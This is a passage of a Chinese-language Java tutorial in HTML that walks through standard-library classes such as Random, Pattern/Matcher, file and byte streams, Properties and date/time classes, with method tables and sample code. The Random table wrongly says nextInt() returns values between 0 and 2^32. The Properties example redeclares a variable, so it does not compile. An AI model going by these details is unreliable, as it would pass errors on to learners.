class="comment">// [9, 5, 4, 3, 1, 1]</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Collections.max(list);</span><br><span class="line">System.out.println(<span class="string">&quot;最大值: &quot;</span> + max); <span class="comment">// 9</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> Collections.frequency(list, <span class="number">1</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;元素1的出现次数: &quot;</span> + count); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h2 id="17-Random-类"><a href="#17-Random-类" class="headerlink" title="17. Random 类"></a>17. <code>Random</code> 类</h2><p>用于生成随机数。</p><h3 id="常用方法-15"><a href="#常用方法-15" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>nextInt()</code></td><td>返回一个介于0（包括）和2^32（不包括）之间的随机整数</td><td>无</td><td><code>int</code></td></tr><tr><td><code>nextInt(int bound)</code></td><td>返回一个介于0（包括）和指定值（不包括）之间的随机整数</td><td>上界</td><td><code>int</code></td></tr><tr><td><code>nextDouble()</code></td><td>返回一个介于0.0（包括）和1.0（不包括）之间的随机双精度浮点数</td><td>无</td><td><code>double</code></td></tr><tr><td><code>nextBoolean()</code></td><td>返回一个随机的布尔值</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>nextGaussian()</code></td><td>返回一个均值为0.0，标准差为1.0的高斯分布的随机双精度浮点数</td><td>无</td><td><code>double</code></td></tr></tbody></table></div><h3 id="示例代码-16"><a href="#示例代码-16" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"><span class="type">int</span> <span class="variable">randInt</span> <span class="operator">=</span> random.nextInt(<span class="number">100</span>); <span class="comment">// 0到99之间的随机整数</span></span><br><span class="line">System.out.println(<span class="string">&quot;随机整数: &quot;</span> + randInt);</span><br><span class="line"></span><br><span class="line"><span class="type">double</span> <span class="variable">randDouble</span> <span class="operator">=</span> random.nextDouble();</span><br><span class="line">System.out.println(<span class="string">&quot;随机浮点数: &quot;</span> + randDouble);</span><br><span class="line"></span><br><span class="line"><span class="type">boolean</span> <span class="variable">randBool</span> <span class="operator">=</span> random.nextBoolean();</span><br><span class="line">System.out.println(<span class="string">&quot;随机布尔值: &quot;</span> + randBool);</span><br></pre></td></tr></table></figure><h2 id="18-Formatter-类"><a href="#18-Formatter-类" class="headerlink" title="18. Formatter 类"></a>18. <code>Formatter</code> 类</h2><p>用于格式化输出，支持多种格式。</p><h3 id="常用方法-16"><a href="#常用方法-16" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>format(String format, Object... args)</code></td><td>格式化指定的参数并返回结果字符串</td><td>格式字符串、参数列表</td><td><code>Formatter</code></td></tr><tr><td><code>close()</code></td><td>关闭格式化器</td><td>无</td><td><code>void</code></td></tr></tbody></table></div><h3 id="示例代码-17"><a href="#示例代码-17" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Formatter</span> <span class="variable">formatter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Formatter</span>();</span><br><span class="line">formatter.format(<span class="string">&quot;姓名: %s, 年龄: %d, 身高: %.2f&quot;</span>, <span class="string">&quot;张三&quot;</span>, <span class="number">25</span>, <span class="number">175.6</span>);</span><br><span class="line">System.out.println(formatter.toString());</span><br><span class="line">formatter.close();</span><br></pre></td></tr></table></figure><h2 id="19-Pattern-和-Matcher-类"><a href="#19-Pattern-和-Matcher-类" class="headerlink" title="19. Pattern 和 Matcher 类"></a>19. <code>Pattern</code> 和 <code>Matcher</code> 类</h2><p>用于正则表达式操作。</p><h3 id="Pattern-类常用方法"><a href="#Pattern-类常用方法" class="headerlink" title="Pattern 类常用方法"></a><code>Pattern</code> 类常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>compile(String regex)</code></td><td>编译正则表达式，返回<code>Pattern</code>对象</td><td>正则表达式字符串</td><td><code>Pattern</code></td></tr><tr><td><code>matcher(CharSequence input)</code></td><td>创建一个<code>Matcher</code>对象，用于在输入字符序列中匹配模式</td><td>输入字符序列</td><td><code>Matcher</code></td></tr></tbody></table></div><h3 id="Matcher-类常用方法"><a href="#Matcher-类常用方法" class="headerlink" title="Matcher 类常用方法"></a><code>Matcher</code> 类常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>find()</code></td><td>查找输入序列中下一个与模式匹配的子序列</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>matches()</code></td><td>判断整个输入序列是否与模式匹配</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>group()</code></td><td>返回上一次匹配操作中匹配的整个子序列</td><td>无</td><td><code>String</code></td></tr><tr><td><code>group(int groupIndex)</code></td><td>返回上一次匹配操作中指定捕获组匹配的子序列</td><td>捕获组索引</td><td><code>String</code></td></tr><tr><td><code>start()</code></td><td>返回上一次匹配操作中匹配子序列的起始索引</td><td>无</td><td><code>int</code></td></tr><tr><td><code>end()</code></td><td>返回上一次匹配操作中匹配子序列的结束索引（不包括）</td><td>无</td><td><code>int</code></td></tr><tr><td><code>replaceAll(String replacement)</code></td><td>使用指定字符串替换所有与模式匹配的子序列</td><td>替换字符串</td><td><code>String</code></td></tr></tbody></table></div><h3 id="示例代码-18"><a href="#示例代码-18" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;\\d+&quot;</span>);</span><br><span class="line"><span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(<span class="string">&quot;年龄: 25, 身高: 175.6&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;匹配到的数字: &quot;</span> + matcher.group());</span><br><span class="line">    System.out.println(<span class="string">&quot;起始索引: &quot;</span> + matcher.start());</span><br><span class="line">    System.out.println(<span class="string">&quot;结束索引: &quot;</span> + matcher.end());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">replaced</span> <span class="operator">=</span> matcher.replaceAll(<span class="string">&quot;XX&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;替换后的字符串: &quot;</span> + replaced); <span class="comment">// 年龄: XX, 身高: XX.6</span></span><br></pre></td></tr></table></figure><h2 id="20-FileReader-和-FileWriter-类"><a href="#20-FileReader-和-FileWriter-类" class="headerlink" title="20. FileReader 和 FileWriter 类"></a>20. <code>FileReader</code> 和 <code>FileWriter</code> 类</h2><p>用于字符文件的读写操作。</p><h3 id="FileReader-类常用方法"><a href="#FileReader-类常用方法" class="headerlink" title="FileReader 类常用方法"></a><code>FileReader</code> 类常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>read()</code></td><td>读取单个字符</td><td>无</td><td><code>int</code></td></tr><tr><td><code>read(char[] cbuf)</code></td><td>读取字符到缓冲区</td><td>字符数组</td><td><code>int</code></td></tr><tr><td><code>close()</code></td><td>关闭流</td><td>无</td><td><code>void</code></td></tr></tbody></table></div><h3 id="FileWriter-类常用方法"><a href="#FileWriter-类常用方法" class="headerlink" title="FileWriter 类常用方法"></a><code>FileWriter</code> 类常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>write(int c)</code></td><td>写入单个字符</td><td>要写入的字符</td><td><code>void</code></td></tr><tr><td><code>write(String str)</code></td><td>写入字符串</td><td>要写入的字符串</td><td><code>void</code></td></tr><tr><td><code>write(char[] cbuf)</code></td><td>写入字符数组</td><td>字符数组</td><td><code>void</code></td></tr><tr><td><code>flush()</code></td><td>刷新缓冲区</td><td>无</td><td><code>void</code></td></tr><tr><td><code>close()</code></td><td>关闭流</td><td>无</td><td><code>void</code></td></tr></tbody></table></div><h3 id="示例代码-19"><a href="#示例代码-19" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写入文件</span></span><br><span class="line"><span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;example.txt&quot;</span>);</span><br><span class="line">writer.write(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">writer.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line"><span class="type">FileReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;example.txt&quot;</span>);</span><br><span class="line"><span class="type">char</span>[] buffer = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">100</span>];</span><br><span class="line"><span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> reader.read(buffer);</span><br><span class="line">System.out.println(<span class="string">&quot;读取的内容: &quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(buffer, <span class="number">0</span>, length));</span><br><span class="line">reader.close();</span><br></pre></td></tr></table></figure><h2 id="21-BufferedReader-和-BufferedWriter-类"><a href="#21-BufferedReader-和-BufferedWriter-类" class="headerlink" title="21. BufferedReader 和 BufferedWriter 类"></a>21. <code>BufferedReader</code> 和 <code>BufferedWriter</code> 类</h2><p>用于提高字符输入输出的效率，带有缓冲区。</p><h3 id="BufferedReader-类常用方法"><a href="#BufferedReader-类常用方法" class="headerlink" title="BufferedReader 类常用方法"></a><code>BufferedReader</code> 类常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>readLine()</code></td><td>读取一行文本</td><td>无</td><td><code>String</code></td></tr><tr><td><code>read()</code></td><td>读取单个字符</td><td>无</td><td><code>int</code></td></tr><tr><td><code>close()</code></td><td>关闭流</td><td>无</td><td><code>void</code></td></tr></tbody></table></div><h3 id="BufferedWriter-类常用方法"><a href="#BufferedWriter-类常用方法" class="headerlink" title="BufferedWriter 类常用方法"></a><code>BufferedWriter</code> 类常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>write(String str)</code></td><td>写入字符串</td><td>要写入的字符串</td><td><code>void</code></td></tr><tr><td><code>newLine()</code></td><td>写入换行符</td><td>无</td><td><code>void</code></td></tr><tr><td><code>flush()</code></td><td>刷新缓冲区</td><td>无</td><td><code>void</code></td></tr><tr><td><code>close()</code></td><td>关闭流</td><td>无</td><td><code>void</code></td></tr></tbody></table></div><h3 id="示例代码-20"><a href="#示例代码-20" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写入文件</span></span><br><span class="line"><span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;example.txt&quot;</span>));</span><br><span class="line">writer.write(<span class="string">&quot;第一行文本&quot;</span>);</span><br><span class="line">writer.newLine();</span><br><span class="line">writer.write(<span class="string">&quot;第二行文本&quot;</span>);</span><br><span class="line">writer.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;example.txt&quot;</span>));</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;读取的行: &quot;</span> + line);</span><br><span class="line">&#125;</span><br><span class="line">reader.close();</span><br></pre></td></tr></table></figure><h2 id="22-InputStream-和-OutputStream-类"><a href="#22-InputStream-和-OutputStream-类" class="headerlink" title="22. InputStream 和 OutputStream 类"></a>22. <code>InputStream</code> 和 <code>OutputStream</code> 类</h2><p>用于字节流的输入输出操作，是所有字节流类的父类。</p><h3 id="InputStream-类常用方法"><a href="#InputStream-类常用方法" class="headerlink" title="InputStream 类常用方法"></a><code>InputStream</code> 类常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>read()</code></td><td>读取单个字节</td><td>无</td><td><code>int</code></td></tr><tr><td><code>read(byte[] b)</code></td><td>读取字节到缓冲区</td><td>字节数组</td><td><code>int</code></td></tr><tr><td><code>close()</code></td><td>关闭流</td><td>无</td><td><code>void</code></td></tr></tbody></table></div><h3 id="OutputStream-类常用方法"><a href="#OutputStream-类常用方法" class="headerlink" title="OutputStream 类常用方法"></a><code>OutputStream</code> 类常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>write(int b)</code></td><td>写入单个字节</td><td>要写入的字节</td><td><code>void</code></td></tr><tr><td><code>write(byte[] b)</code></td><td>写入字节数组</td><td>字节数组</td><td><code>void</code></td></tr><tr><td><code>flush()</code></td><td>刷新缓冲区</td><td>无</td><td><code>void</code></td></tr><tr><td><code>close()</code></td><td>关闭流</td><td>无</td><td><code>void</code></td></tr></tbody></table></div><h3 id="示例代码-21"><a href="#示例代码-21" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写入字节到文件</span></span><br><span class="line"><span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;example.bin&quot;</span>);</span><br><span class="line">os.write(<span class="number">65</span>); <span class="comment">// 写入字符&#x27;A&#x27;的ASCII码</span></span><br><span class="line">os.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件读取字节</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;example.bin&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> is.read();</span><br><span class="line">System.out.println(<span class="string">&quot;读取的字节: &quot;</span> + data); <span class="comment">// 65</span></span><br><span class="line">is.close();</span><br></pre></td></tr></table></figure><h2 id="23-BufferedInputStream-和-BufferedOutputStream-类"><a href="#23-BufferedInputStream-和-BufferedOutputStream-类" class="headerlink" title="23. BufferedInputStream 和 BufferedOutputStream 类"></a>23. <code>BufferedInputStream</code> 和 <code>BufferedOutputStream</code> 类</h2><p>带缓冲区的字节流，提高读写效率。</p><h3 id="常用方法-17"><a href="#常用方法-17" class="headerlink" title="常用方法"></a>常用方法</h3><p>与<code>InputStream</code>和<code>OutputStream</code>类似，但在读写时使用缓冲区减少磁盘I/O操作。</p><h3 id="示例代码-22"><a href="#示例代码-22" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写入字节到文件</span></span><br><span class="line"><span class="type">BufferedOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;example.bin&quot;</span>));</span><br><span class="line">bos.write(<span class="number">65</span>);</span><br><span class="line">bos.flush();</span><br><span class="line">bos.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件读取字节</span></span><br><span class="line"><span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;example.bin&quot;</span>));</span><br><span class="line"><span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> bis.read();</span><br><span class="line">System.out.println(<span class="string">&quot;读取的字节: &quot;</span> + data);</span><br><span class="line">bis.close();</span><br></pre></td></tr></table></figure><h2 id="24-Properties-类"><a href="#24-Properties-类" class="headerlink" title="24. Properties 类"></a>24. <code>Properties</code> 类</h2><p>用于读取和写入属性文件（键值对）。</p><h3 id="常用方法-18"><a href="#常用方法-18" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>load(InputStream inStream)</code></td><td>从输入流加载属性列表</td><td>输入流</td><td><code>void</code></td></tr><tr><td><code>store(OutputStream out, String comments)</code></td><td>将属性列表存储到输出流</td><td>输出流、注释</td><td><code>void</code></td></tr><tr><td><code>getProperty(String key)</code></td><td>获取指定键对应的值</td><td>键</td><td><code>String</code></td></tr><tr><td><code>setProperty(String key, String value)</code></td><td>设置键值对</td><td>键、值</td><td><code>Object</code></td></tr><tr><td><code>list(PrintStream out)</code></td><td>将属性列表打印到指定输出流</td><td>输出流</td><td><code>void</code></td></tr></tbody></table></div><h3 id="示例代码-23"><a href="#示例代码-23" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">props.setProperty(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;张三&quot;</span>);</span><br><span class="line">props.setProperty(<span class="string">&quot;age&quot;</span>, <span class="string">&quot;25&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将属性写入文件</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">OutputStream</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;config.properties&quot;</span>)) &#123;</span><br><span class="line">    props.store(output, <span class="string">&quot;配置文件&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从文件读取属性</span></span><br><span class="line"><span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"><span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;config.properties&quot;</span>)) &#123;</span><br><span class="line">    props.load(input);</span><br><span class="line">    System.out.println(<span class="string">&quot;name: &quot;</span> + props.getProperty(<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    System.out.println(<span class="string">&quot;age: &quot;</span> + props.getProperty(<span class="string">&quot;age&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="25-GregorianCalendar-类"><a href="#25-GregorianCalendar-类" class="headerlink" title="25. GregorianCalendar 类"></a>25. <code>GregorianCalendar</code> 类</h2><p>提供了更全面的日期和时间功能。</p><h3 id="常用方法-19"><a href="#常用方法-19" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>get(int field)</code></td><td>获取指定日历字段的值</td><td>日历字段（如<code>YEAR</code>、<code>MONTH</code>等）</td><td><code>int</code></td></tr><tr><td><code>set(int field, int value)</code></td><td>设置指定日历字段的值</td><td>日历字段、新值</td><td><code>void</code></td></tr><tr><td><code>add(int field, int amount)</code></td><td>给指定日历字段添加或减去指定的时间量</td><td>日历字段、时间量</td><td><code>void</code></td></tr><tr><td><code>getTime()</code></td><td>将<code>GregorianCalendar</code>转换为<code>Date</code>对象</td><td>无</td><td><code>Date</code></td></tr><tr><td><code>setTime(Date date)</code></td><td>使用<code>Date</code>对象设置日历时间</td><td><code>Date</code>对象</td><td><code>void</code></td></tr></tbody></table></div><h3 id="示例代码-24"><a href="#示例代码-24" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GregorianCalendar</span> <span class="variable">calendar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GregorianCalendar</span>();</span><br><span class="line">System.out.println(<span class="string">&quot;当前年份: &quot;</span> + calendar.get(Calendar.YEAR));</span><br><span class="line">calendar.add(Calendar.MONTH, <span class="number">1</span>); <span class="comment">// 月份加1</span></span><br><span class="line"><span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> calendar.getTime();</span><br><span class="line">System.out.println(<span class="string">&quot;新日期: &quot;</span> + date.toString());</span><br></pre></td></tr></table></figure><h2 id="26-TimeZone-类"><a href="#26-TimeZone-类" class="headerlink" title="26. TimeZone 类"></a>26. <code>TimeZone</code> 类</h2><p>用于获取和操作时区信息。</p><h3 id="常用方法-20"><a href="#常用方法-20" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>getDefault()</code></td><td>获取默认时区</td><td>无</td><td><code>TimeZone</code></td></tr><tr><td><code>getAvailableIDs()</code></td><td>获取所有可用的时区ID</td><td>无</td><td><code>String[]</code></td></tr><tr><td><code>getTimeZone(String ID)</code></td><td>获取指定ID的时区</td><td>时区ID</td><td><code>TimeZone</code></td></tr><tr><td><code>useDaylightTime()</code></td><td>判断该时区是否使用夏令时</td><td>无</td><td><code>boolean</code></td></tr><tr><td><code>getDisplayName()</code></td><td>获取时区的显示名称</td><td>无</td><td><code>String</code></td></tr></tbody></table></div><h3 id="示例代码-25"><a href="#示例代码-25" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TimeZone</span> <span class="variable">defaultZone</span> <span class="operator">=</span> TimeZone.getDefault();</span><br><span class="line">System.out.println(<span class="string">&quot;默认时区ID: &quot;</span> + defaultZone.getID());</span><br><span class="line">System.out.println(<span class="string">&quot;默认时区名称: &quot;</span> + defaultZone.getDisplayName());</span><br><span class="line"><span class="type">TimeZone</span> <span class="variable">newYorkZone</span> <span class="operator">=</span> TimeZone.getTimeZone(<span class="string">&quot;America/New_York&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;纽约时区是否使用夏令时: &quot;</span> + newYorkZone.useDaylightTime());</span><br></pre></td></tr></table></figure><h2 id="27-SimpleDateFormat-类"><a href="#27-SimpleDateFormat-类" class="headerlink" title="27. SimpleDateFormat 类"></a>27. <code>SimpleDateFormat</code> 类</h2><p>用于格式化和解析日期。</p><h3 id="常用方法-21"><a href="#常用方法-21" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>format(Date date)</code></td><td>格式化日期为字符串</td><td><code>Date</code>对象</td><td><code>String</code></td></tr><tr><td><code>parse(String source)</code></td><td>将字符串解析为<code>Date</code>对象</td><td>字符串</td><td><code>Date</code></td></tr></tbody></table></div><h3 id="示例代码-26"><a href="#示例代码-26" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="type">Date</span> <span class="variable">currentDate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">formattedDate</span> <span class="operator">=</span> sdf.format(currentDate);</span><br><span class="line">System.out.println(<span class="string">&quot;格式化后的日期: &quot;</span> + formattedDate);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">Date</span> <span class="variable">parsedDate</span> <span class="operator">=</span> sdf.parse(<span class="string">&quot;2022-07-01 10:30:45&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;解析后的日期: &quot;</span> + parsedDate.toString());</span><br><span class="line">&#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="28-BigInteger-类"><a href="#28-BigInteger-类" class="headerlink" title="28. BigInteger 类"></a>28. <code>BigInteger</code> 类</h2><p>用于表示任意精度的整数。</p><h3 id="常用方法-22"><a href="#常用方法-22" class="headerlink" title="常用方法"></a>常用方法</h3><div class="table-container"><table><thead><tr><th>方法名</th><th>描述</th><th>参数</th><th>返回值</th></tr></thead><tbody><tr><td><code>add(BigInteger val)</code></td><td>加法运算</td><td>另一个<code>BigInteger</code></td><td><code>BigInteger</code></td></tr><tr><td><code>subtract(BigInteger val)</code></td><td>减法运算</td><td>另一个<code>BigInteger</code></td><td><code>BigInteger</code></td></tr><tr><td><code>multiply(BigInteger val)</code></td><td>乘法运算</td><td>另一个<code>BigInteger</code></td><td><code>BigInteger</code></td></tr><tr><td><code>divide(BigInteger val)</code></td><td>除法运算</td><td>另一个<code>BigInteger</code></td><td><code>BigInteger</code></td></tr><tr><td><code>mod(BigInteger val)</code></td><td>取模运算</td><td>另一个<code>BigInteger</code></td><td><code>BigInteger</code></td></tr><tr><td><code>pow(int exponent)</code></td><td>幂运算</td><td>指数</td><td><code>BigInteger</code></td></tr><tr><td><code>compareTo(BigInteger val)</code></td><td>比较两个<code>BigInteger</code>的大小</td><td>另一个<code>BigInteger</code></td><td><code>int</code></td></tr><tr><td><code>toString()</code></td><td>返回<code>BigInteger</code>的字符串表示</td><td>无</td><td><code>String</code></td></tr></tbody></table></div><h3 id="示例代码-27"><a href="#示例代码-27" class="headerlink" title="示例代码"></a>示例代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 